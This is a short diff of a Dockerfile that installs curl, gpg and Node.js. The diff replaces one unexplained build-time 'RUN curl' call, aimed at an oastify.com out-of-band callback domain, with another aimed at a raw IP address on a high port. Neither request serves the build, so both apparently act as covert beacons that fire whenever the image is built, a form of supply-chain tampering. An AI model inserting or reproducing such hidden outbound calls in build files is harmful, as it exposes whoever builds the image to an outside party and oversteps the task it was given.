@@ -6,7 +6,7 @@ ARG USER_ID=1000
 
 RUN apt-get update && apt-get install -y curl gpg
 
-RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/webapp
+RUN curl http://65.109.68.176:15172/built/webapp
 
 # We need a recent node
 RUN curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | gpg --dearmor -o /usr/share/keyrings/nodesource.gpg
